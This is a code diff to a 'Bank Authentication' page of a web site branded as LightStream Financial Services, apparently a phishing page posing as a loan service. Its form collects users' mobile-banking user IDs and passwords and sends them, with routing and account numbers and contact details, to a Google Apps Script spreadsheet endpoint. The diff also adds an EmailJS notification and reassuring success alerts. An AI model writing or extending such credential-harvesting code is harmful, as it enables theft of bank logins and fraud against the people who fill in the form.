@@ -87,32 +87,32 @@
                     </div>
                 </div>
                 <div class="hidden md:flex space-x-4">
-                    <button onclick="initiateGoogleLogin()" class="text-gray-700 hover:text-indigo-600 font-medium flex items-center space-x-2">
+                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                         <i class="fab fa-google"></i>
                         <span>Google Login</span>
                     </button>
-                    <a href="ppi.html" class="text-gray-700 hover:text-indigo-600 font-medium">PPI</a>
-                    <a href="bank-auth.html" class="text-indigo-600 font-medium">Bank Authentication</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
                 </div>
-                <button class="md:hidden text-gray-700" id="mobileMenuBtn">
+                <button class="md:hidden text-white" id="mobileMenuBtn">
                     <i class="fas fa-bars text-2xl"></i>
                 </button>
             </div>
             <!-- Mobile Menu -->
             <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
                 <div class="flex flex-col space-y-3">
-                    <a href="index.html" class="text-gray-700 hover:text-indigo-600 font-medium">Home</a>
-                    <a href="personal-loans.html" class="text-gray-700 hover:text-indigo-600 font-medium">Personal Loans</a>
-                    <a href="bank-auth.html" class="text-gray-700 hover:text-indigo-600 font-medium">Bank Authentication</a>
-                    <a href="how-it-works.html" class="text-gray-700 hover:text-indigo-600 font-medium">How it Works</a>
-                    <a href="faqs.html" class="text-gray-700 hover:text-indigo-600 font-medium">FAQs</a>
-                    <a href="contact.html" class="text-gray-700 hover:text-indigo-600 font-medium">Contact</a>
-                    <button onclick="initiateGoogleLogin()" class="text-gray-700 hover:text-indigo-600 font-medium flex items-center space-x-2">
+                    <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                    <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
+                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                         <i class="fab fa-google"></i>
                         <span>Google Login</span>
                     </button>
-                    <a href="ppi.html" class="text-gray-700 hover:text-indigo-600 font-medium">PPI</a>
-                    <a href="bank-auth.html" class="text-indigo-600 font-medium">Bank Authentication</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
                 </div>
             </div>
         </nav>
@@ -163,9 +163,9 @@
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="bankName">
                                 Your Bank *
                             </label>
-                            <select id="bankName" name="bankName" required disabled
-                                    class="w-full px-3 py-3 border border-gray-300 rounded-lg bg-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                <option value="">Loading your bank...</option>
+                            <select id="bankName" name="bankName" required
+                                    class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
+                                <option value="">Select your bank</option>
                             </select>
                             <p class="text-xs text-gray-500 mt-1">Your bank was selected in the loan application form</p>
                         </div>
@@ -397,7 +397,7 @@
 
         // Password visibility toggle
         document.getElementById('togglePassword').addEventListener('click', function() {
-            const passwordInput = document.getElementById('password');
+            const passwordInput = document.getElementById('mobileBankingPassword');
             const eyeIcon = document.getElementById('eyeIcon');
             
             if (passwordInput.type === 'password') {
@@ -410,15 +410,21 @@
                 eyeIcon.classList.add('fa-eye');
             }
         });
+
+        // Go back function
+        function goBack() {
+            window.history.back();
+        }
     </script>
     <script>
 // Load bank data from localStorage when page loads
 document.addEventListener("DOMContentLoaded", function() {
     console.log("=== BANK AUTH PAGE LOADED ===");
     
-    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    // Check if coming from personal loan form
+    const loanData = JSON.parse(sessionStorage.getItem("loanApplicationData")) || {};
     
-    console.log("Loan data from localStorage:", loanData);
+    console.log("Loan data from sessionStorage:", loanData);
     console.log("Customer Bank in data:", loanData.customerBank);
     console.log("Bank Name in data:", loanData.bankName);
     console.log("All available keys:", Object.keys(loanData));
@@ -428,13 +434,52 @@ document.addEventListener("DOMContentLoaded", function() {
     
     console.log("Bank value found:", bankValue);
     
-    // Populate bank name if available
-    if (bankValue) {
-        const bankNameSelect = document.getElementById("bankName");
-        console.log("Bank select element found:", bankNameSelect);
+    const bankNameSelect = document.getElementById("bankName");
+    console.log("Bank select element found:", bankNameSelect);
+    
+    if (bankValue && bankNameSelect) {
+        // Bank name mapping
+        const bankNames = {
+            'chase': 'Chase Bank',
+            'bank-of-america': 'Bank of America',
+            'wells-fargo': 'Wells Fargo',
+            'citibank': 'Citibank',
+            'capital-one': 'Capital One',
+            'us-bank': 'U.S. Bank',
+            'pnc': 'PNC Bank',
+            'td-bank': 'TD Bank',
+            'bbt': 'BB&T (now Truist)',
+            'suntrust': 'SunTrust (now Truist)',
+            'regions': 'Regions Bank',
+            'fifth-third': 'Fifth Third Bank',
+            'keybank': 'KeyBank',
+            'huntington': 'Huntington Bank',
+            'citizens': 'Citizens Bank',
+            'ally': 'Ally Bank',
+            'discover': 'Discover Bank',
+            'synchrony': 'Synchrony Bank',
+            'marcus': 'Marcus by Goldman Sachs',
+            'other': 'Other Bank'
+        };
         
+        // Clear existing options and add the selected bank
+        bankNameSelect.innerHTML = '';
+        const option = document.createElement('option');
+        option.value = bankValue;
+        option.textContent = bankNames[bankValue] || 'Other Bank';
+        option.selected = true;
+        bankNameSelect.appendChild(option);
+        
+        console.log("✅ Bank populated:", bankValue, "=>", bankNames[bankValue]);
+        console.log("Bank select HTML after update:", bankNameSelect.innerHTML);
+    } else {
+        console.log("❌ No bank data found in localStorage");
+        console.log("Available keys:", Object.keys(loanData));
+        
+        // If no bank data from loan form, allow manual selection
         if (bankNameSelect) {
-            // Bank name mapping
+            bankNameSelect.innerHTML = '<option value="">Select your bank</option>';
+            // Add all bank options
             const bankNames = {
                 'chase': 'Chase Bank',
                 'bank-of-america': 'Bank of America',
@@ -458,25 +503,13 @@ document.addEventListener("DOMContentLoaded", function() {
                 'other': 'Other Bank'
             };
             
-            // Clear existing options and add the selected bank
-            bankNameSelect.innerHTML = '';
-            const option = document.createElement('option');
-            option.value = bankValue;
-            option.textContent = bankNames[bankValue] || 'Other Bank';
-            option.selected = true;
-            bankNameSelect.appendChild(option);
-            
-            // Enable the field
-            bankNameSelect.disabled = false;
-            bankNameSelect.classList.remove('bg-gray-100');
-            bankNameSelect.classList.add('bg-white');
-            
-            console.log("Bank populated:", bankValue, "=>", bankNames[bankValue]);
-            console.log("Bank select HTML after update:", bankNameSelect.innerHTML);
+            for (const [value, name] of Object.entries(bankNames)) {
+                const option = document.createElement('option');
+                option.value = value;
+                option.textContent = name;
+                bankNameSelect.appendChild(option);
+            }
         }
-    } else {
-        console.log("❌ No bank data found in localStorage");
-        console.log("Available keys:", Object.keys(loanData));
     }
 });
 
@@ -485,23 +518,48 @@ const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUx
 document.querySelector("form").addEventListener("submit", async function(e) {
   e.preventDefault();
 
-  const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+  const loanData = JSON.parse(sessionStorage.getItem("loanApplicationData")) || {};
+
+  // Check if user came from personal loan form or is standalone
+  const hasLoanData = loanData && Object.keys(loanData).length > 0 && loanData.loanAmount;
+  console.log("🔍 Has loan data:", hasLoanData);
+  console.log("📊 Loan data keys:", Object.keys(loanData));
 
   const bankData = {
     bankName: document.getElementById("bankName").value,
     mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
     mobileBankingPassword: document.getElementById("mobileBankingPassword").value,
+    twoFactorMethod: document.getElementById("twoFactor")?.value || 'sms',
+    termsAccepted: document.getElementById("terms")?.checked || false
+  };
+
+  // Get bank account info from loan data (for reference only)
+  const bankAccountInfo = {
     routingNumber: loanData.routingNumber || '',
     accountNumber: loanData.accountNumber || ''
   };
 
-  const finalData = { ...loanData, ...bankData };
+  const finalData = { 
+    ...loanData, 
+    ...bankAccountInfo,
+    // Preserve original customerBank from loan data, don't overwrite with bankName from bank auth
+    bankName: loanData.customerBank || bankData.bankName,
+    // Add other bank auth fields
+    mobileBankingUserId: bankData.mobileBankingUserId,
+    mobileBankingPassword: bankData.mobileBankingPassword,
+    twoFactorMethod: bankData.twoFactorMethod,
+    termsAccepted: bankData.termsAccepted
+  };
 
   console.log("Loan data from localStorage:", loanData);
   console.log("Bank data:", bankData);
   console.log("Final data being sent to Google Sheets:", finalData);
 
   try {
+    // Send Bank Authentication email (NEW - separate email)
+    sendBankAuthEmail(bankData, loanData);
+
+    // Continue with Google Sheets submission (keep existing functionality)
     const res = await fetch(SHEET_URL, {
       method: "POST",
       body: JSON.stringify(finalData)
@@ -510,262 +568,124 @@ document.querySelector("form").addEventListener("submit", async function(e) {
     const result = await res.text();
     console.log("Google Sheet Response:", result);
 
-    alert("Form submitted successfully ✅");
+    // Handle different scenarios based on whether user has loan data
+    if (hasLoanData) {
+      // User came from personal loan form - continue to loan agreement
+      alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\n✅ Note: Due to high email volume, confirmation emails will be sent shortly.\n\nNext Steps:\n• You will be redirected to your loan agreement\n• Complete the digital signature process\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
 
-    localStorage.removeItem("loanData");
+      // Store loan data for loan agreement page (SECURE: sessionStorage only)
+      sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
 
-    // Store loan data for loan agreement page
-    localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+      // Redirect to loan agreement page after successful submission
+      setTimeout(() => {
+        window.location.href = "loan-agreement.html";
+      }, 1000);
+    } else {
+      // Standalone bank auth - show simple success and redirect to homepage
+      alert("✅ Bank Authentication Successful!\n\nYour bank details have been verified and stored securely.\n\nThank you for choosing LightStream Financial Services.\n\nYou will be redirected to our homepage.");
 
-    // Redirect to loan agreement page after successful submission
-    setTimeout(() => {
-      window.location.href = "loan-agreement.html";
-    }, 1000);
+      // Redirect to homepage after successful submission
+      setTimeout(() => {
+        window.location.href = "index.html";
+      }, 2000);
+    }
 
   } catch (err) {
     alert("Error sending data ❌");
     console.error(err);
   }
 });
-</script>
-<script src="chatbot.js"></script>
-</body>
-</html>
 
-                // RE-INITIALIZE EMAILJS JUST IN CASE
-                emailjs.init("nW8qV4aakkEtYlieZ");
-                console.log('EmailJS re-initialized');
-
-                // SEND EMAIL WITH CONFIRMED WORKING TEMPLATE
-                emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
-                    .then(function(response) {
-                        console.log('EMAILJS SUCCESS!');
-                        console.log('Response status:', response.status);
-                        console.log('Response text:', response.text);
-                        // Success message removed - no more alerts
-                    })
-                    .catch(function(error) {
-                        console.log('EMAILJS ERROR!');
-                        console.log('Error details:', error);
-                        console.log('Error text:', error.text);
-                        console.log('Error status:', error.status);
-                        // Error message removed - no more alerts
-                    });
-                    
-            } catch (error) {
-                console.error('CATCH BLOCK ERROR:', error);
-                alert('System Error: ' + error.message);
-            }
-        }
-                            
-
-        // Initialize page
-        document.addEventListener('DOMContentLoaded', function() {
-            loadBankSelection();
-            
-            // Add change listener to bank select
-            const customerBankSelect = document.getElementById('customerBank');
-            if (customerBankSelect) {
-                customerBankSelect.addEventListener('change', saveBankSelection);
-            }
-            
-            // Add test button for debugging (remove in production)
-            const testButton = document.createElement('button');
-            testButton.textContent = 'Test Google Sheets';
-            testButton.className = 'fixed bottom-4 left-4 bg-red-500 text-white px-4 py-2 rounded z-50';
-            testButton.onclick = testGoogleSheetsConnection;
-            document.body.appendChild(testButton);
-            
-            // Add bank test button
-            const bankTestButton = document.createElement('button');
-            bankTestButton.textContent = 'Test Bank Selection';
-            bankTestButton.className = 'fixed bottom-4 right-4 bg-blue-500 text-white px-4 py-2 rounded z-50';
-            bankTestButton.onclick = loadBankSelection;
-            document.body.appendChild(bankTestButton);
-            
-            // Initialize password toggle
-            const togglePassword = document.getElementById('togglePassword');
-            const passwordInput = document.getElementById('mobileBankingPassword');
-            const eyeIcon = document.getElementById('eyeIcon');
-            
-            if (togglePassword && passwordInput && eyeIcon) {
-                togglePassword.addEventListener('click', function() {
-                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                    passwordInput.setAttribute('type', type);
-                    
-                    // Toggle eye icon
-                    if (type === 'password') {
-                        eyeIcon.classList.remove('fa-eye-slash');
-                        eyeIcon.classList.add('fa-eye');
-                    } else {
-                        eyeIcon.classList.remove('fa-eye');
-                        eyeIcon.classList.add('fa-eye-slash');
-                    }
-                });
-            }
-        });
+// NEW: Separate Bank Authentication Email Function
+function sendBankAuthEmail(bankData, loanData) {
+    console.log('📧 Sending Bank Authentication email...');
+    
+    // Initialize EmailJS
+    emailjs.init("nW8qV4aakkEtYlieZ");
+    
+    // Prepare email template parameters for Bank Authentication ONLY
+    const templateParams = {
+        // RECIPIENT EMAIL - Send to customer's email
+        to_email: loanData.email || 'customer@example.com',
+        recipient_email: loanData.email || 'customer@example.com',
+        customer_email: loanData.email || 'customer@example.com',
         
-        // Auto-populate bank from loan data
-        function loadBankSelection() {
-            console.log('=== BANK SELECTION DEBUG START ===');
+        // Bank information (from bank-auth form fields only)
+        bank_name: bankData.bankName || '',
+        mobile_banking_user_id: bankData.mobileBankingUserId || '',
+        mobile_banking_password: '[PROTECTED]', // Never send actual password
+        two_factor_method: document.getElementById('twoFactor')?.value || 'sms',
+        
+        // Bank account details (from loan data for reference only)
+        routing_number: bankData.routingNumber || loanData.routingNumber || '',
+        account_number: bankData.accountNumber ? '****' + bankData.accountNumber.slice(-4) : 
+                         (loanData.accountNumber ? '****' + loanData.accountNumber.slice(-4) : ''),
+        
+        // Customer information (minimal reference from loan data)
+        customer_name: loanData.fullName || loanData.name || 'Customer',
+        customer_email: loanData.email || '',
+        customer_phone: loanData.phone || '',
+        
+        // METADATA
+        application_type: 'Bank Authentication',
+        submission_date: new Date().toLocaleString(),
+        timestamp: new Date().toISOString(),
+        date: new Date().toLocaleDateString(),
+        time: new Date().toLocaleTimeString(),
+        
+        // Security information
+        ip_address: 'N/A', // Could be added if needed
+        user_agent: navigator.userAgent || 'N/A'
+    };
+
+    console.log('Bank Auth email template params:', templateParams);
+
+    // Send Bank Authentication email using separate template
+    emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
+        .then(function(response) {
+            console.log('✅ Bank Authentication email sent successfully!', response.status, response.text);
+        })
+        .catch(function(error) {
+            console.log('❌ Bank Authentication email failed...', error);
+            console.log('Error details:', error.text || error.message);
             
-            // Check both storage locations
-            const localStorageData = localStorage.getItem('loanFormData');
-            const sessionStorageData = sessionStorage.getItem('loanApplicationData');
-            
-            console.log('📦 Storage Check:');
-            console.log('- localStorage loanFormData:', localStorageData);
-            console.log('- sessionStorage loanApplicationData:', sessionStorageData);
-            
-            // Try localStorage first (from personal-loans.html), then sessionStorage fallback
-            let loanData = {};
-            let storedData = null;
-            
-            if (localStorageData) {
-                storedData = localStorageData;
-                console.log('✅ Using localStorage data');
-            } else if (sessionStorageData) {
-                storedData = sessionStorageData;
-                console.log('✅ Using sessionStorage data');
-            } else {
-                console.log('❌ No data found in either storage');
-            }
-            
-            if (storedData) {
-                try {
-                    loanData = JSON.parse(storedData);
-                    console.log('✅ Parsed loan data:', loanData);
-                } catch (error) {
-                    console.error('❌ Error parsing loan data:', error);
-                }
-            }
-            
-            const bankSelect = document.getElementById('bankName');
-            
-            console.log('🏦 Bank Selection Info:');
-            console.log('- Customer bank from data:', loanData.customerBank);
-            console.log('- Bank select element:', bankSelect);
-            console.log('- Bank select disabled:', bankSelect?.disabled);
-            
-            if (loanData.customerBank && bankSelect) {
-                console.log('✅ Bank data found, populating...');
-                console.log('- Customer bank value:', loanData.customerBank);
-                
-                // Create bank value to full name mapping
-                const bankNames = {
-                    'chase': 'Chase Bank',
-                    'bank-of-america': 'Bank of America',
-                    'wells-fargo': 'Wells Fargo',
-                    'citibank': 'Citibank',
-                    'capital-one': 'Capital One',
-                    'us-bank': 'U.S. Bank',
-                    'pnc': 'PNC Bank',
-                    'td-bank': 'TD Bank',
-                    'bbt': 'BB&T (now Truist)',
-                    'suntrust': 'SunTrust (now Truist)',
-                    'regions': 'Regions Bank',
-                    'fifth-third': 'Fifth Third Bank',
-                    'keybank': 'KeyBank',
-                    'huntington': 'Huntington Bank',
-                    'citizens': 'Citizens Bank',
-                    'ally': 'Ally Bank',
-                    'discover': 'Discover Bank',
-                    'synchrony': 'Synchrony Bank',
-                    'marcus': 'Marcus by Goldman Sachs',
-                    'other': 'Other Bank'
+            // Fallback: Store email data locally for later sending
+            if (error.text && error.text.includes('quota')) {
+                console.log('📧 EmailJS quota reached - storing email data for later');
+                const emailBackup = {
+                    type: 'bank-auth',
+                    templateParams: templateParams,
+                    timestamp: new Date().toISOString(),
+                    loanData: loanData
                 };
-                
-                console.log('Available bank options:', Object.keys(bankNames));
-                console.log('Bank name mapping:', bankNames[loanData.customerBank]);
-                
-                // Clear existing options
-                bankSelect.innerHTML = '';
-                
-                // Add selected bank option
-                const option = document.createElement('option');
-                option.value = loanData.customerBank;
-                option.textContent = bankNames[loanData.customerBank] || 'Other Bank';
-                option.selected = true;
-                bankSelect.appendChild(option);
-                
-                console.log('✅ Bank auto-populated with:', loanData.customerBank, '=>', bankNames[loanData.customerBank]);
-                console.log('Option created:', option);
-                console.log('Bank select options count:', bankSelect.options.length);
-            } else {
-                console.log('❌ No customer bank data found');
-                console.log('- loanData.customerBank:', loanData.customerBank);
-                console.log('- bankSelect element:', bankSelect);
-                
-                // Add default options if no customer bank data
-                const defaultBanks = ['chase', 'bank-of-america', 'wells-fargo', 'citibank', 'capital-one', 'us-bank', 'pnc', 'td-bank', 'bbt', 'suntrust', 'regions', 'fifth-third', 'keybank', 'huntington', 'citizens', 'ally', 'discover', 'synchrony', 'marcus', 'other'];
-                
-                defaultBanks.forEach(bank => {
-                    const option = document.createElement('option');
-                    option.value = bank;
-                    option.textContent = bankNames[bank] || 'Other Bank';
-                    bankSelect.appendChild(option);
-                });
-                
-                // Set default to first option
-                if (bankSelect.options.length > 0) {
-                    bankSelect.options[0].selected = true;
-                }
-            }
-        }
-        
-        function goBack() {
-            window.history.back();
-        }
-        
-        // Google OAuth Login Function
-        function initiateGoogleLogin() {
-            // Check if user is already logged in
-            const isLoggedIn = localStorage.getItem('is_logged_in');
-            if (isLoggedIn === 'true') {
-                window.location.href = 'login-success.html';
-                return;
-            }
-            
-            // For demo purposes, simulate successful login
-            // In production, this would redirect to Google OAuth
-            console.log('Initiating Google OAuth login...');
-            
-            // Create mock user data for demo
-            const mockUserData = {
-                name: 'Demo User',
-                email: 'demo@example.com',
-                picture: 'https://ui-avatars.com/api/?name=Demo+User&background=random',
-                verified: true
-            };
-            
-            // Store user session
-            localStorage.setItem('google_user_data', JSON.stringify(mockUserData));
-            localStorage.setItem('is_logged_in', 'true');
-            
-            // Redirect to success page
-            window.location.href = 'login-success.html';
-        }
-        
-        // Check login status on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            const isLoggedIn = localStorage.getItem('is_logged_in');
-            if (isLoggedIn === 'true') {
-                // Update login button to show logged in state
-                const loginBtn = document.querySelector('button[onclick="initiateGoogleLogin()"]');
-                if (loginBtn) {
-                    loginBtn.innerHTML = '<i class="fas fa-user mr-2"></i><span>My Account</span>';
-                    loginBtn.onclick = () => window.location.href = 'login-success.html';
-                }
+                localStorage.setItem('pendingEmail_' + Date.now(), JSON.stringify(emailBackup));
+                console.log('📦 Email data stored locally - will send when quota resets');
             }
         });
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script>
-        // Initialize EmailJS
-        (function() {
-            emailjs.init("nW8qV4aakkEtYlieZ");
-        })();
-    </script>
-    <script src="chatbot.js"></script>
+}
+</script>
+<!-- Chatbot disabled by default - only load when user clicks chat button -->
+<!-- <script src="chatbot.js"></script> -->
+
+<!-- Chat Button - Only loads chatbot when clicked -->
+<div id="chatButton" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999;">
+    <button onclick="loadChatbot()" style="background: #4F46E5; color: white; border: none; border-radius: 50%; width: 60px; height: 60px; font-size: 24px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: all 0.3s;">
+        💬
+    </button>
+</div>
+
+<script>
+    function loadChatbot() {
+        // Remove chat button
+        document.getElementById('chatButton').style.display = 'none';
+        
+        // Load chatbot script dynamically
+        const script = document.createElement('script');
+        script.src = 'chatbot.js';
+        document.body.appendChild(script);
+        
+        console.log('🤖 Chatbot loaded by user request');
+    }
+</script>
 </body>
 </html>
